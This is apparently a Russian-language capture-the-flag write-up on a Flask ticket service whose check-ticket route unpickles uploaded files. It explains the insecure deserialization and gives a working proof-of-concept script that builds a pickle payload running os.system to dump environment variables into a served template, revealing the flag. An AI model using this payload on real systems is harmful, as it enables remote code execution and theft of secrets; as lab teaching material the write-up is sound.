# Касса

В предоставленном нам коде заметим следующий функционал:

```python
@main.route("/check-ticket", methods=["GET", "POST"])
@login_required
def checkVerification():
    if request.method == "POST":
        file = request.files["ticket_file"]
        data = file.read()
        success=True
        if not data:
            success=False
            message =  "Нет данных для загрузки"
        try:
            ticket = pickle.loads(data)
            if not isinstance(ticket, TicketDTO):
                success=False
                message =  "Некорректные данные!"
            if sha1((ticket.name + ticket.user + str(ticket.time_stamp) + Config.SECRET_KEY).encode()).hexdigest() != ticket.sign:
                success=False
                message =  "Этот билет подделка!"
            if success:
                message =  f"Билет валиден! Владелец: {ticket.user}, Тип: {ticket.name}, Дата и время покупки: {ticket.time_stamp}"
        except Exception as e:
            success=False
            message =  f"Ошибка при чтении билета!"
        return render_template("check_verification.html", message=message, success=success)
    return render_template("check_verification.html")
```


В частности, на строку `ticket = pickle.loads(data)`
Данные "анпиклятся", а сами данные - просто прочитанный файл, переданный в HTTP-запросе

Процесс десерализации произвольных данных с помощью pickle не является безопасным

напишем PoC скрипт:

```python
import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))


base_url = 'http://10.10.11.51:5012'
s = requests.Session()

resp = s.post(base_url+"/login", data={"username":"asd", "password":"asd"})
print(resp.status_code)

command = 'env > /app/templates/register.html' 

payload = pickle.dumps(PickleRCE())

open("pickled", "wb").write(payload)

resp = s.post(base_url+"/check-ticket", files={"ticket_file": payload})

print(resp.status_code)
```

поскольку флаг лежит в переменных окружения, а на машине нет доступа к нам и в интернет, перенаправим результат команды env в темплейт, который рендерится при попадании на /register

запускаем, идем на /register, получаем флаг

FLAG=nto{w3lc0m3_t0_t4e_tr41n!!!}